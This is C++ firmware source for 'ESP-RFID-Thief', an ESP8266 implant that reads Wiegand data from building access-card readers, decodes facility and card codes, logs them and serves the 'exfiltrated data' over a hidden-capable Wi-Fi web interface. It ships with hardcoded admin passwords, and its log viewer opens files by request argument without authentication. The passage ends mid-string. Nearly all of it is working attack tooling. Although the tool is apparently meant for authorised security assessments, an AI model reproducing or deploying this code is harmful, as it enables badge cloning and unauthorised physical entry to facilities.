/*
 * ESP-RFID-Thief
 * Original Tastic RFID Thief by Fran Brown of Bishop Fox
 * Ported to the ESP12S by Corey Harding of www.Exploit.Agency / www.LegacySecurityGroup.com
 * ESP-RFID-Thief Software is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.
 * MIT License
    
    Copyright (c) [2017] [Corey Harding]
    
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
*/
#include "HelpText.h"
#include "License.h"
#include "version.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <ArduinoJson.h> // ArduinoJson library 5.11.0 by Benoit Blanchon https://github.com/bblanchon/ArduinoJson
#include <ESP8266FtpServer.h> // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <DoubleResetDetector.h> // Double Reset Detector library VERSION: 1.0.0 by Stephen Denne https://github.com/datacute/DoubleResetDetector

#define DRD_TIMEOUT 3
#define DRD_ADDRESS 0
DoubleResetDetector drd(DRD_TIMEOUT, DRD_ADDRESS);

#define LED_BUILTIN 2
#define DATA0 14
#define DATA1 12

// Port for web server
ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
FtpServer ftpSrv;
const byte DNS_PORT = 53;
DNSServer dnsServer;

HTTPClient http;

const char* update_path = "/update";
int accesspointmode;
char ssid[32];
char password[64];
int channel;
int hidden;
char local_IPstr[16];
char gatewaystr[16];
char subnetstr[16];
char update_username[32];
char update_password[64];
char ftp_username[32];
char ftp_password[64];
int ftpenabled;
int ledenabled;
char logname[31];

// Begin RFID Thief Config
#define MAX_BITS 100                 // max number of bits 
#define WEIGAND_WAIT_TIME  3000      // time to wait for another weigand pulse.  


unsigned char databits[MAX_BITS];    // stores all of the data bits
volatile unsigned int bitCount = 0;
unsigned char flagDone;              // goes low when data is currently being captured
unsigned int weigand_counter;        // countdown until we assume there are no more bits

volatile unsigned long facilityCode=0;        // decoded facility code
volatile unsigned long cardCode=0;            // decoded card code

// Breaking up card value into 2 chunks to create 10 char HEX value
volatile unsigned long bitHolder1 = 0;
volatile unsigned long bitHolder2 = 0;
volatile unsigned long cardChunk1 = 0;
volatile unsigned long cardChunk2 = 0;


///////////////////////////////////////////////////////
// Process interrupts

// interrupt that happens when INTO goes low (0 bit)
void ISR_INT0()
{
  //Serial.print("0");
  bitCount++;
  flagDone = 0;
  
  if(bitCount < 23) {
      bitHolder1 = bitHolder1 << 1;
  }
  else {
      bitHolder2 = bitHolder2 << 1;
  }
    
  weigand_counter = WEIGAND_WAIT_TIME;  
  
}

// interrupt that happens when INT1 goes low (1 bit)
void ISR_INT1()
{
  //Serial.print("1");
  bitCount++;
  flagDone = 0;
  
   if(bitCount < 23) {
      bitHolder1 = bitHolder1 << 1;
      bitHolder1 |= 1;
   }
   else {
     bitHolder2 = bitHolder2 << 1;
     bitHolder2 |= 1;
   }
  
  weigand_counter = WEIGAND_WAIT_TIME;  
}
// End RFID Thief Config

void settingsPage()
{
  if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
  String accesspointmodeyes;
  String accesspointmodeno;
  if (accesspointmode==1){
    accesspointmodeyes=" checked=\"checked\"";
    accesspointmodeno="";
  }
  else {
    accesspointmodeyes="";
    accesspointmodeno=" checked=\"checked\"";
  }
  String ftpenabledyes;
  String ftpenabledno;
  if (ftpenabled==1){
    ftpenabledyes=" checked=\"checked\"";
    ftpenabledno="";
  }
  else {
    ftpenabledyes="";
    ftpenabledno=" checked=\"checked\"";
  }
  String ledenabledyes;
  String ledenabledno;
  if (ledenabled==1){
    ledenabledyes=" checked=\"checked\"";
    ledenabledno="";
  }
  else {
    ledenabledyes="";
    ledenabledno=" checked=\"checked\"";
  }
  String hiddenyes;
  String hiddenno;
  if (hidden==1){
    hiddenyes=" checked=\"checked\"";
    hiddenno="";
  }
  else {
    hiddenyes="";
    hiddenno=" checked=\"checked\"";
  }
  server.send(200, "text/html", 
  String()+
  F(
  "<!DOCTYPE HTML>"
  "<html>"
  "<head>"
  "<meta name = \"viewport\" content = \"width = device-width, initial-scale = 1.0, maximum-scale = 1.0, user-scalable=0\">"
  "<title>ESP-RFID-Thief Settings</title>"
  "<style>"
  "\"body { background-color: #808080; font-family: Arial, Helvetica, Sans-Serif; Color: #000000; }\""
  "</style>"
  "</head>"
  "<body>"
  "<a href=\"/\"><- BACK TO INDEX</a><br><br>"
  "<h1>ESP-RFID-Thief Settings</h1>"
  "<a href=\"/restoredefaults\"><button>Restore Default Configuration</button></a>"
  "<hr>"
  "<FORM action=\"/settings\"  id=\"configuration\" method=\"post\">"
  "<P>"
  "<b>WiFi Configuration:</b><br><br>"
  "<b>Network Type</b><br>"
  )+
  F("Access Point Mode: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"1\"")+accesspointmodeyes+F("><br>"
  "Join Existing Network: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"0\"")+accesspointmodeno+F("><br><br>"
  "<b>Hidden<br></b>"
  "Yes <INPUT type=\"radio\" name=\"hidden\" value=\"1\"")+hiddenyes+F("><br>"
  "No <INPUT type=\"radio\" name=\"hidden\" value=\"0\"")+hiddenno+F("><br><br>"
  "SSID: <input type=\"text\" name=\"ssid\" value=\"")+ssid+F("\" maxlength=\"31\" size=\"31\"><br>"
  "Password: <input type=\"password\" name=\"password\" value=\"")+password+F("\" maxlength=\"64\" size=\"31\"><br>"
  "Channel: <select name=\"channel\" form=\"configuration\"><option value=\"")+channel+"\" selected>"+channel+F("</option><option value=\"1\">1</option><option value=\"2\">2</option><option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option><option value=\"6\">6</option><option value=\"7\">7</option><option value=\"8\">8</option><option value=\"9\">9</option><option value=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option><option value=\"13\">13</option><option value=\"14\">14</option></select><br><br>"
  "IP: <input type=\"text\" name=\"local_IPstr\" value=\"")+local_IPstr+F("\" maxlength=\"16\" size=\"31\"><br>"
  "Gateway: <input type=\"text\" name=\"gatewaystr\" value=\"")+gatewaystr+F("\" maxlength=\"16\" size=\"31\"><br>"
  "Subnet: <input type=\"text\" name=\"subnetstr\" value=\"")+subnetstr+F("\" maxlength=\"16\" size=\"31\"><br><br>"
  "<hr>"
  "<b>Web Interface Administration Settings:</b><br><br>"
  "Username: <input type=\"text\" name=\"update_username\" value=\"")+update_username+F("\" maxlength=\"31\" size=\"31\"><br>"
  "Password: <input type=\"password\" name=\"update_password\" value=\"")+update_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<hr>"
  "<b>FTP Server Settings</b><br>"
  "<small>Changes require a reboot.</small><br>"
  "Enabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\"")+ftpenabledyes+F("><br>"
  "Disabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\"")+ftpenabledno+F("><br>"
  "FTP Username: <input type=\"text\" name=\"ftp_username\" value=\"")+ftp_username+F("\" maxlength=\"31\" size=\"31\"><br>"
  "FTP Password: <input type=\"password\" name=\"ftp_password\" value=\"")+ftp_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<hr>"
  "<b>Power LED:</b><br>"
  "<small>Changes require a reboot.</small><br>"
  "Enabled <INPUT type=\"radio\" name=\"ledenabled\" value=\"1\"")+ledenabledyes+F("><br>"
  "Disabled <INPUT type=\"radio\" name=\"ledenabled\" value=\"0\"")+ledenabledno+F("><br><br>"
  "<hr>"
  "<b>RFID Capture Log:</b><br>"
  "<small>Useful to change this value to differentiate between facilities during various security assessments.</small><br>"
  "File Name: <input type=\"text\" name=\"logname\" value=\"")+logname+F("\" maxlength=\"30\" size=\"31\"><br>"
  "<hr>"
  "<INPUT type=\"radio\" name=\"SETTINGS\" value=\"1\" hidden=\"1\" checked=\"checked\">"
  "<INPUT type=\"submit\" value=\"Apply Settings\">"
  "</FORM>"
  "<br><a href=\"/reboot\"><button>Reboot Device</button></a>"
  "</P>"
  "</body>"
  "</html>"
  )
  );
}

void handleSettings()
{
  if (server.hasArg("SETTINGS")) {
    handleSubmitSettings();
  }
  else {
    settingsPage();
  }
}

void returnFail(String msg)
{
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(500, "text/plain", msg + "\r\n");
}

void handleSubmitSettings()
{
  String SETTINGSvalue;

  if (!server.hasArg("SETTINGS")) return returnFail("BAD ARGS");
  
  SETTINGSvalue = server.arg("SETTINGS");
  accesspointmode = server.arg("accesspointmode").toInt();
  server.arg("ssid").toCharArray(ssid, 32);
  server.arg("password").toCharArray(password, 64);
  channel = server.arg("channel").toInt();
  hidden = server.arg("hidden").toInt();
  server.arg("local_IPstr").toCharArray(local_IPstr, 16);
  server.arg("gatewaystr").toCharArray(gatewaystr, 16);
  server.arg("subnetstr").toCharArray(subnetstr, 16);
  server.arg("update_username").toCharArray(update_username, 32);
  server.arg("update_password").toCharArray(update_password, 64);
  server.arg("ftp_username").toCharArray(ftp_username, 32);
  server.arg("ftp_password").toCharArray(ftp_password, 64);
  ftpenabled = server.arg("ftpenabled").toInt();
  ledenabled = server.arg("ledenabled").toInt();
  server.arg("logname").toCharArray(logname, 31);
  
  if (SETTINGSvalue == "1") {
    saveConfig();
    server.send(200, "text/html", F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/reboot\"><button>Reboot Device</button></a><br><br>Settings have been saved.<br>Some setting may require manually rebooting before taking effect.<br>If network configuration has changed then be sure to connect to the new network first in order to access the web interface."));
    loadConfig();
  }
  else if (SETTINGSvalue == "0") {
    settingsPage();
  }
  else {
    returnFail("Bad SETTINGS value");
  }
}

bool loadDefaults() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = "1";
  json["ssid"] = "ESP-RFID-Thief";
  json["password"] = "";
  json["channel"] = "6";
  json["hidden"] = "0";
  json["local_IP"] = "192.168.1.1";
  json["gateway"] = "192.168.1.1";
  json["subnet"] = "255.255.255.0";
  json["update_username"] = "admin";
  json["update_password"] = "hacktheplanet";
  json["ftp_username"] = "ftp-admin";
  json["ftp_password"] = "hacktheplanet";
  json["ftpenabled"] = "0";
  json["ledenabled"] = "1";
  json["logname"] = "log.txt";
  File configFile = SPIFFS.open("/esprfidthief.json", "w");
  json.printTo(configFile);
  loadConfig();
}

bool loadConfig() {
  File configFile = SPIFFS.open("/esprfidthief.json", "r");
  if (!configFile) {
    delay(3500);
    loadDefaults();
  }

  size_t size = configFile.size();

  std::unique_ptr<char[]> buf(new char[size]);
  configFile.readBytes(buf.get(), size);
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.parseObject(buf.get());
  
  if (!json["version"]) {
    delay(3500);
    loadDefaults();
    ESP.restart();
  }

  //Resets config to factory defaults on an update.
  if (json["version"]!=version) {
    delay(3500);
    loadDefaults();
    ESP.restart();
  }

  strcpy(ssid, (const char*)json["ssid"]);
  strcpy(password, (const char*)json["password"]);
  channel = json["channel"];
  hidden = json["hidden"];
  accesspointmode = json["accesspointmode"];
  strcpy(local_IPstr, (const char*)json["local_IP"]);
  strcpy(gatewaystr, (const char*)json["gateway"]);
  strcpy(subnetstr, (const char*)json["subnet"]);

  strcpy(update_username, (const char*)json["update_username"]);
  strcpy(update_password, (const char*)json["update_password"]);

  strcpy(ftp_username, (const char*)json["ftp_username"]);
  strcpy(ftp_password, (const char*)json["ftp_password"]);
  ftpenabled = json["ftpenabled"];
  ledenabled = json["ledenabled"];
  strcpy(logname, (const char*)json["logname"]);
 
  IPAddress local_IP;
  local_IP.fromString(local_IPstr);
  IPAddress gateway;
  gateway.fromString(gatewaystr);
  IPAddress subnet;
  subnet.fromString(subnetstr);

/*
  Serial.println(accesspointmode);
  Serial.println(ssid);
  Serial.println(password);
  Serial.println(channel);
  Serial.println(hidden);
  Serial.println(local_IP);
  Serial.println(gateway);
  Serial.println(subnet);
*/
  WiFi.persistent(false);
  //ESP.eraseConfig();
// Determine if set to Access point mode
  if (accesspointmode == 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);

//    Serial.print("Starting Access Point ... ");
//    Serial.println(WiFi.softAP(ssid, password, channel, hidden) ? "Success" : "Failed!");
    WiFi.softAP(ssid, password, channel, hidden);

//    Serial.print("Setting up Network Configuration ... ");
//    Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Success" : "Failed!");
    WiFi.softAPConfig(local_IP, gateway, subnet);

//    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.softAPIP());
  }
// or Join existing network
  else if (accesspointmode != 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
//    Serial.print("Setting up Network Configuration ... ");
    WiFi.config(local_IP, gateway, subnet);
//    WiFi.config(local_IP, gateway, subnet);

//    Serial.print("Connecting to network ... ");
//    WiFi.begin(ssid, password);
    WiFi.begin(ssid, password);
    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.localIP());
  }

  return true;
}

bool saveConfig() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = accesspointmode;
  json["ssid"] = ssid;
  json["password"] = password;
  json["channel"] = channel;
  json["hidden"] = hidden;
  json["local_IP"] = local_IPstr;
  json["gateway"] = gatewaystr;
  json["subnet"] = subnetstr;
  json["update_username"] = update_username;
  json["update_password"] = update_password;
  json["ftp_username"] = ftp_username;
  json["ftp_password"] = ftp_password;
  json["ftpenabled"] = ftpenabled;
  json["ledenabled"] = ledenabled;
  json["logname"] = logname;

  File configFile = SPIFFS.open("/esprfidthief.json", "w");
  json.printTo(configFile);
  return true;
}

File fsUploadFile;
String webString;

void ListLogs(){
  String directory;
  directory="/";
  FSInfo fs_info;
  SPIFFS.info(fs_info);
  String total;
  total=fs_info.totalBytes;
  String used;
  used=fs_info.usedBytes;
  String freespace;
  freespace=fs_info.totalBytes-fs_info.usedBytes;
  Dir dir = SPIFFS.openDir(directory);
  String FileList = String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
  while (dir.next()) {
    String FileName = dir.fileName();
    File f = dir.openFile("r");
    FileList += " ";
    if((!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/esprfidthief.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/viewlog?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletelog?payload="+FileName+"\"><button>Delete File</button></td></tr>";
  }
  FileList += "</table>";
  server.send(200, "text/html", FileList);
}

bool RawFile(String rawfile) {
  if (SPIFFS.exists(rawfile)) {
    if(!server.authenticate(update_username, update_password)){
      server.requestAuthentication();}
    File file = SPIFFS.open(rawfile, "r");
    size_t sent = server.streamFile(file, "application/octet-stream");
    file.close();
    return true;
  }
  return false;
}

void ViewLog(){
  webString="";
  String payload;
  String ShowPL;
  payload += server.arg(0);
  File f = SPIFFS.open(payload, "r");
  String webString = f.readString();
  f.close();
  ShowPL = String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/logs\">List Exfiltrated Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletelog?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
  webString="";
  server.send(200, "text/html", ShowPL);
}

// Start Networking
void setup() {
  Serial.begin(9600);
  //SPIFFS.format();
  SPIFFS.begin();
  
 //loadDefaults(); //uncomment to restore default settings if double reset fails for some reason

  if (drd.detectDoubleReset()) {
    Serial.println("Double Reset Detected");
    Serial.println("Loading default config...");
    loadDefaults();
  }
  
  loadConfig();

//Set up Web Pages
  server.on("/",[]() {
    FSInfo fs_info;
    SPIFFS.info(fs_info);
    String total;
    total=fs_info.totalBytes;
    String used;
    used=fs_info.usedBytes;
    String freespace;
    freespace=fs_info.totalBytes-fs_info.usedBytes;
    server.send(200, "text/html", String()+F("<html><body><b>ESP-RFID-Thief v")+version+F("</b><br><img width='86' height='86' src='data:image/png;base64,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'><br><i>by Corey Harding<br>www.LegacySecurityGroup.com / www.Exploit.Agency</i><br>-----<br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+F("<br>-----<br><a href=\"/logs\">List Exfiltrated Data</a><br>-<br><a href=\"/settings\">Configure 